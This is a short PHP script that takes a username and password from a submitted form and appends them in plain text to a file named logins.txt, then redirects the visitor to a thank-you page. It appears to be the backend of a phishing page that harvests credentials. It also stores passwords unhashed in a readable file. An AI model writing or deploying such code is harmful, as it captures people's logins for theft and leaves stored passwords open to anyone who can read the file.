<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);

    $data = "Username: $username | Password: $password\n";

    // Save to a text file
    file_put_contents("logins.txt", $data, FILE_APPEND | LOCK_EX) or die("❌ Could not write to logins.txt");


    // Redirect to thank you page
    header("Location: thankyou.html");
    exit();
}
?>
